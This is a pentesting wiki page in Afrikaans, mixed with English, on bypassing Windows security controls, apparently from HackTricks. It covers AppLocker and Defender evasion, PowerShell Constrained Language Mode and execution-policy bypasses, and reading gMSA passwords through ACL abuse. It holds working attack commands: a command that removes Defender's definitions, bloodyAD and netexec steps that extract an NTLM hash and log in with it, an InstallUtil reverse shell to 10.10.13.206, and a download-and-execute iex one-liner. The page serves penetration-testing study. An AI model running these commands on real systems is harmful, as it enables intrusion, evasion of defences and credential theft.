# Windows-sekuriteitskontroles

{{#include ../../banners/hacktricks-training.md}}

## AppLocker-beleid

'n Toepassingswitlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat toegelaat word om op 'n stelsel teenwoordig te wees en uitgevoer te word. Die doel is om die omgewing te beskerm teen skadelike malware en nie-goedgekeurde sagteware wat nie by die spesifieke besigheidsbehoeftes van 'n organisasie pas nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **toepassingswitlysoplossing** en gee stelseladministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **fynkorrelige beheer** oor uitvoerbare lêers, scripts, Windows-installasielêers, DLL's, verpakte toepassings en verpakte toepassing-installeerders.\
Dit is algemeen vir organisasies om **cmd.exe en PowerShell.exe te blokkeer** en skryftoegang tot sekere gidse te beperk, **maar dit kan alles omseil word**.

### Kontroleer

Kontroleer watter lêers/uitbreidings op die swartlys/witlys is:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, en bied ’n manier om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nuttige **skryfbare vouers** om AppLocker-beleid te omseil: Indien AppLocker toelaat dat enigiets binne `C:\Windows\System32` of `C:\Windows` uitgevoer word, is daar **skryfbare vouers** wat jy kan gebruik om **dit te omseil**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Algemeen **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
- **Swak geskryfde reëls kan ook omseil word**
- Byvoorbeeld, met **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** kan jy ’n **vouer genaamd `allowed`** enige plek skep, en dit sal toegelaat word.
- Organisasies fokus ook dikwels daarop om die **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable** te **blokkeer**, maar vergeet van die **ander** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
- **DLL enforcement** word baie selde geaktiveer weens die bykomende las wat dit op ’n stelsel kan plaas, asook die hoeveelheid toetsing wat nodig is om te verseker dat niks sal breek nie. Daarom sal die gebruik van **DLLs as backdoors help om AppLocker te omseil**.
- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Bewaring van geloofsbriewe

### Security Accounts Manager (SAM)

Plaaslike geloofsbriewe is in hierdie lêer teenwoordig; die wagwoorde is gehash.

### Local Security Authority (LSA) - LSASS

Die **geloofsbriewe** (gehash) word in die **geheue** van hierdie substelsel **gestoor** vir Single Sign-On-doeleindes.\
**LSA** administreer die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikertoestemmings...), **authentication**, **access tokens**...\
LSA sal die een wees wat die verskafde geloofsbriewe binne die **SAM**-lêer **kontroleer** (vir ’n plaaslike login) en met die **domain controller** **kommunikeer** om ’n domeingebruiker te authenticate.

Die **geloofsbriewe** word binne die **LSASS-proses gestoor**: Kerberos-tickets, NT- en LM-hashes, maklik gedekripteerde wagwoorde.

### LSA secrets

LSA kan sommige geloofsbriewe op skyf stoor:

- Wagwoord van die rekenaarrekening van die Active Directory (onbereikbare domain controller).
- Wagwoorde van die rekeninge van Windows-dienste
- Wagwoorde vir geskeduleerde take
- Meer (wagwoord van IIS-toepassings...)

### NTDS.dit

Dit is die databasis van die Active Directory. Dit is slegs in Domain Controllers teenwoordig.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is ’n antivirus wat in Windows 10 en Windows 11, asook in weergawes van Windows Server, beskikbaar is. Dit **blokkeer** algemene pentesting tools soos **`WinPEAS`**. Daar is egter maniere om hierdie **beskermings te omseil**.

### Kontroleer

Om die **status** van **Defender** te kontroleer, kan jy die PS cmdlet **`Get-MpComputerStatus`** uitvoer (kontroleer die waarde van **`RealTimeProtectionEnabled`** om te bepaal of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Om dit te enumerate, kan jy ook die volgende uitvoer:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS beveilig lêers deur middel van encryption, met gebruik van ’n **symmetric key** wat as die **File Encryption Key (FEK)** bekend staan. Hierdie sleutel word met die gebruiker se **public key** geënkripteer en binne die geënkripteerde lêer se $EFS **alternative data stream** gestoor. Wanneer decryption benodig word, word die ooreenstemmende **private key** van die gebruiker se digital certificate gebruik om die FEK uit die $EFS stream te dekripteer. Meer besonderhede kan [hier](https://en.wikipedia.org/wiki/Encrypting_File_System) gevind word.

**Decryption scenarios without user initiation** sluit die volgende in:

- Wanneer lêers of vouers na ’n nie-EFS file system, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), verskuif word, word hulle outomaties gedekripteer.
- Geënkripteerde lêers wat oor die netwerk via die SMB/CIFS protocol gestuur word, word voor oordrag gedekripteer.

Hierdie encryption method bied **transparent access** tot geënkripteerde lêers vir die eienaar. Om egter bloot die eienaar se password te verander en aan te meld, sal nie decryption toelaat nie.

**Key Takeaways**:

- EFS gebruik ’n symmetric FEK wat met die gebruiker se public key geënkripteer is.
- Decryption gebruik die gebruiker se private key om toegang tot die FEK te verkry.
- Automatic decryption vind onder spesifieke omstandighede plaas, soos wanneer na FAT32 gekopieer word of tydens network transmission.
- Geënkripteerde lêers is sonder bykomende stappe vir die eienaar toeganklik.

### Check EFS info

Kontroleer of ’n **user** hierdie **service** **used** het deur te kontroleer of hierdie path bestaan:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kontroleer **who** **access** tot die lêer het met cipher /c \<file>\
Jy kan ook `cipher /e` en `cipher /d` binne ’n folder gebruik om al die lêers te **encrypt** en **decrypt**

### Decrypting EFS files

#### Being Authority System

Hierdie metode vereis dat die **victim user** ’n **process** binne die host **running**. Indien dit die geval is, kan jy met behulp van ’n `meterpreter` sessions die token van die gebruiker se process impersonate (`impersonate_token` vanaf `incognito`). Of jy kan eenvoudig na die gebruiker se process `migrate`.

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van service accounts in IT-infrastrukture te vereenvoudig. Anders as tradisionele service accounts wat dikwels die "**Password never expire**"-setting enabled het, bied gMSAs ’n veiliger en meer managebare oplossing:

- **Automatic Password Management**: gMSAs gebruik ’n komplekse password van 240 karakters wat outomaties verander volgens domain- of computer-policy. Hierdie proses word deur Microsoft se Key Distribution Service (KDC) hanteer, wat die behoefte aan handmatige password updates uitskakel.
- **Enhanced Security**: Hierdie accounts is immuun teen lockouts en kan nie vir interactive logins gebruik word nie, wat hul security verbeter.
- **Multiple Host Support**: gMSAs kan oor verskeie hosts gedeel word, wat hulle ideaal maak vir services wat op verskeie servers loop.
- **Scheduled Task Capability**: Anders as managed service accounts, ondersteun gMSAs die uitvoering van scheduled tasks.
- **Simplified SPN Management**: Die system dateer die Service Principal Name (SPN) outomaties op wanneer daar veranderinge aan die computer se sAMaccount-details of DNS name is, wat SPN management vereenvoudig.

Die passwords vir gMSAs word in die LDAP property _**msDS-ManagedPassword**_ gestoor en word elke 30 dae outomaties deur Domain Controllers (DCs) reset. Hierdie password, ’n geënkripteerde data blob bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrators en die servers waarop die gMSAs geïnstalleer is, retrieved word, wat ’n secure environment verseker. Om toegang tot hierdie inligting te verkry, word ’n secured connection soos LDAPS vereis, of die connection moet met 'Sealing & Secure' authenticated wees.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Jy kan hierdie password met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> lees.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Vind meer inligting in hierdie plasing**](https://cube0x0.github.io/Relaying-for-gMSA/)

Kyk ook na hierdie [webblad](https://cube0x0.github.io/Relaying-for-gMSA/) oor hoe om ’n **NTLM relay attack** uit te voer om die **wagwoord** van **gMSA** te **lees**.<sup>[[1]](#references)</sup>

### Misbruik van ACL chaining om gMSA managed password te lees (GenericAll -> ReadGMSAPassword)

In baie omgewings kan gebruikers met lae voorregte na gMSA-geheime pivot sonder ’n DC compromise deur verkeerd gekonfigureerde objek-ACL’s te misbruik:<sup>[[3]](#references)</sup>

- ’n Groep wat jy kan beheer (byvoorbeeld via GenericAll/GenericWrite) kry `ReadGMSAPassword` oor ’n gMSA.
- Deur jouself by daardie groep te voeg, erf jy die reg om die gMSA se `msDS-ManagedPassword`-blob oor LDAP te lees en bruikbare NTLM-geloofsbriewe af te lei.

Tipiese werksvloei:

1) Ontdek die pad met BloodHound en merk jou foothold-prinsipale as Owned. Soek rande soos:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Voeg jouself by die tussenliggende groep wat jy beheer (voorbeeld met bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Lees die gMSA-bestuurde wagwoord via LDAP en lei die NTLM-hash af. NetExec outomatiseer die onttrekking van `msDS-ManagedPassword` en omskakeling na NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Staaf as die gMSA met die NTLM-hash (geen plaintext nodig nie). As die rekening in Remote Management Users is, sal WinRM direk werk:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notas:
- LDAP reads of `msDS-ManagedPassword` require sealing (e.g., LDAPS/sign+seal). Tools handle this automatically.
- gMSAs are often granted local rights like WinRM; validate group membership (e.g., Remote Management Users) to plan lateral movement.
- If you only need the blob to compute the NTLM yourself, see MSDS-MANAGEDPASSWORD_BLOB structure.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), maak die bestuur van plaaslike Administrator-wagwoorde moontlik. Hierdie wagwoorde, wat **gerandomiseer**, uniek en **gereeld verander** word, word sentraal in Active Directory gestoor. Toegang tot hierdie wagwoorde word deur ACLs beperk tot gemagtigde gebruikers. Met voldoende toestemmings kan plaaslike admin-wagwoorde gelees word.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sluit baie van die kenmerke wat** nodig is om PowerShell effektief te gebruik, **vas**, soos die blokkering van COM objects, die toelating van slegs goedgekeurde .NET types, XAML-based workflows, PowerShell classes, en meer.

### **Kontroleer**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In huidige Windows sal daardie Bypass nie werk nie, maar jy kan [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\
**Om dit te compile, moet jy moontlik** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` byvoeg en **die projek na .Net4.5 verander**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) om **Powershell**-kode in enige proses uit te voer en die constrained mode te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

By verstek is dit op **restricted** gestel. Belangrikste maniere om hierdie beleid te omseil:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Meer kan [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> gevind word

## Security Support Provider Interface (SSPI)

Dit is die API wat gebruik kan word om gebruikers te authentiseer.

Die SSPI is verantwoordelik daarvoor om die geskikte protokol te vind vir twee masjiene wat wil kommunikeer. Die voorkeurmetode hiervoor is Kerberos. Daarna sal die SSPI onderhandel oor watter authentication protocol gebruik sal word. Hierdie authentication protocols word Security Support Providers (SSP's) genoem, is binne elke Windows-masjien in die vorm van 'n DLL geleë, en albei masjiene moet dieselfde een ondersteun om te kan kommunikeer.

### Main SSPs

- **Kerberos**: Die voorkeur een
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** en **NTLMv2**: Kompatibiliteitsredes
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers en LDAP, wagwoord in die vorm van 'n MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL en TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Dit word gebruik om te onderhandel oor die protokol wat gebruik moet word (Kerberos of NTLM, met Kerberos as die verstek)
- %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes of slegs een aanbied.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n funksie wat 'n **toestemmingsboodskap vir verhoogde aktiwiteite** moontlik maak.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Verwysings

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
